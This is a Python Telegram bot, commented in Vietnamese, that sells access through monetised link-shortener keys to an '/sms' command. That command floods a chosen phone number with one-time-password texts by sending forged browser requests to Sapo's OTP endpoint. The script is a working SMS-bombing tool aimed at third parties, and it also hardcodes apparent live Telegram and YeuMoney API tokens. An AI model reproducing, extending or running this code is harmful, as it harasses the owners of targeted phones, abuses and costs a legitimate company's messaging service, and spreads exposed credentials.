import requests
import time
import json
import random
import string
import threading
import os
from datetime import datetime, timedelta
import telebot
from telebot import types

# Token của bot Telegram (thay bằng token thực tế từ BotFather)
TOKEN = "7228865349:AAGRGenJYqtEK-1UEEklRxrDkn5eaEJ-0nI"  # Thay token của bạn vào đây

# API Key của yeumoney
YEUMONEY_API_URL = "https://yeumoney.com/QL_api.php?token=5f8ca8734e93fabf98f50400ca8744f5d929aa41768059813680cc3f52fd4b1e&url="

# URL của trang web hiển thị key
KEY_WEBSITE_URL = "https://tranquankeybot.blogspot.com/2025/02/keybot.html?ma={key}"

# Thời gian hiệu lực của key (2 ngày)
KEY_EXPIRY_DAYS = 2

# Tên file JSON để lưu dữ liệu
DATA_FILE = "bot_data.json"

# Khởi tạo bot
bot = telebot.TeleBot(TOKEN)

# Danh sách người dùng đã xác minh và key (lưu trong bộ nhớ và file JSON)
verified_users = {}  # {user_id: expiry_datetime}
user_codes = {}  # {user_id: {"code": key, "created_at": datetime}}

# Danh sách các họ, tên đệm và tên phổ biến
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

# Hàm đọc dữ liệu từ file JSON
def load_data():
    global verified_users, user_codes
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
            verified_users = {int(k): datetime.fromisoformat(v) for k, v in data.get("verified_users", {}).items()}
            user_codes = {
                int(k): {
                    "code": v["code"],
                    "created_at": datetime.fromisoformat(v["created_at"])
                } for k, v in data.get("user_codes", {}).items()
            }
    else:
        verified_users = {}
        user_codes = {}

# Hàm ghi dữ liệu vào file JSON
def save_data():
    data = {
        "verified_users": {str(k): v.isoformat() for k, v in verified_users.items()},
        "user_codes": {str(k): {"code": v["code"], "created_at": v["created_at"].isoformat()} for k, v in user_codes.items()}
    }
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Tạo tên ngẫu nhiên
def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()

# Tạo mã key ngẫu nhiên với tiền tố "TMQ"
def generate_random_code():
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))  # 5 ký tự ngẫu nhiên
    return f"TMQ{random_part}"  # Ví dụ: TMQ7K9P2

# Rút gọn link qua yeumoney
def shorten_link_with_yeumoney(long_url):
    try:
        response = requests.get(YEUMONEY_API_URL + long_url)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(f"Error shortening URL: {response.text}")
            return long_url
    except Exception as e:
        print(f"Exception in shorten_link_with_yeumoney: {e}")
        return long_url

# Kiểm tra key có còn hiệu lực không
def is_key_valid(user_id):
    if user_id in verified_users:
        expiry_time = verified_users[user_id]
        return datetime.now() < expiry_time
    return False

# Hàm gửi OTP (ví dụ, thêm các hàm khác từ mã của bạn)
def send_otp_via_sapo(sdt):
    cookies = {
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/30/2024 16:21:32',
        'lang': 'vi',
        'G_ENABLED_IDPS': 'google',
        'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'referral': 'https://accounts.sapo.vn/',
        'pageview': '7',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        'phonenumber': sdt,
    }

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
    print("Sapo OTP response:", response.text)
    return response.text

otp_functions = [
    send_otp_via_sapo,  # Thêm các hàm khác vào đây
]

def send_otp_with_delay(func, phone, delay):
    time.sleep(delay)
    func(phone)

# Xử lý lệnh /sms
@bot.message_handler(commands=['sms'])
def sms_command(message):
    user_id = message.from_user.id
    args = message.text.split()[1:]  # Lấy các tham số sau /sms

    # Kiểm tra trạng thái xác minh và thời hạn key
    if not is_key_valid(user_id):
        # Nếu chưa xác minh hoặc key hết hạn
        if user_id in verified_users:
            del verified_users[user_id]  # Xóa trạng thái xác minh cũ nếu key hết hạn
            save_data()  # Lưu thay đổi vào file
        
        if user_id not in user_codes:
            # Tạo key mới với tiền tố TMQ
            code = generate_random_code()
            user_codes[user_id] = {
                "code": code,
                "created_at": datetime.now()
            }
            save_data()  # Lưu key mới vào file
        else:
            # Dùng lại key cũ nếu chưa xác minh
            code = user_codes[user_id]["code"]

        # Tạo URL với key và rút gọn qua yeumoney
        verification_url = KEY_WEBSITE_URL.format(key=code)
        shortened_url = shorten_link_with_yeumoney(verification_url)

        # Tạo nút inline
        keyboard = types.InlineKeyboardMarkup()
        verify_button = types.InlineKeyboardButton("Vượt Link Lấy Key", url=shortened_url)
        keyboard.add(verify_button)

        bot.reply_to(
            message,
            f"Bạn chưa xác minh để sử dụng bot.\nNhấn nút dưới đây để vượt link qua YeuMoney và lấy mã key:\n(Key sẽ có hiệu lực trong {KEY_EXPIRY_DAYS} ngày sau khi xác minh)",
            reply_markup=keyboard
        )
        bot.send_message(
            message.chat.id,
            "Sau khi vượt link và lấy key, dùng lệnh: /verify <mã key> để xác minh."
        )
        return

    if len(args) < 1:
        bot.reply_to(message, "Vui lòng nhập số điện thoại!\nCách dùng: /sms <số điện thoại> [độ trễ (giây)]")
        return
    
    phone = args[0]
    delay = float(args[1]) if len(args) > 1 else 0

    bot.reply_to(message, f"Đang gửi SMS spam tới số {phone} với độ trễ {delay} giây...")

    threads = []
    for func in otp_functions:
        thread = threading.Thread(target=send_otp_with_delay, args=(func, phone, delay))
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    bot.reply_to(message, f"Đã gửi xong SMS spam tới số {phone}!")

# Xử lý lệnh /verify
@bot.message_handler(commands=['verify'])
def verify_command(message):
    user_id = message.from_user.id
    args = message.text.split()[1:]  # Lấy các tham số sau /verify

    if len(args) < 1:
        bot.reply_to(message, "Vui lòng nhập mã key!\nCách dùng: /verify <mã key>")
        return

    code = args[0]
    
    # Kiểm tra định dạng key (phải bắt đầu bằng TMQ và đúng độ dài)
    if not (code.startswith("TMQ") and len(code) == 8):
        bot.reply_to(message, "Mã key không hợp lệ! Key phải bắt đầu bằng 'TMQ' và có 8 ký tự.")
        return

    # Kiểm tra key có tồn tại và đúng với user_id không
    if user_id in user_codes and user_codes[user_id]["code"] == code:
        # Đặt thời gian hết hạn là 2 ngày kể từ khi xác minh
        expiry_time = datetime.now() + timedelta(days=KEY_EXPIRY_DAYS)
        verified_users[user_id] = expiry_time
        del user_codes[user_id]  # Xóa mã key sau khi xác minh thành công
        save_data()  # Lưu dữ liệu vào file
        bot.reply_to(message, f"Xác minh thành công! Bạn có thể sử dụng lệnh /sms trong {KEY_EXPIRY_DAYS} ngày.")
    else:
        bot.reply_to(message, "Mã key không đúng hoặc không thuộc về bạn. Vui lòng dùng lệnh /sms để lấy key mới qua YeuMoney.")

# Hàm chính để khởi động bot
def main():
    # Đọc dữ liệu từ file JSON khi khởi động
    load_data()

    print("Bot đang chạy...")
    bot.polling(none_stop=True)

if __name__ == '__main__':
    main()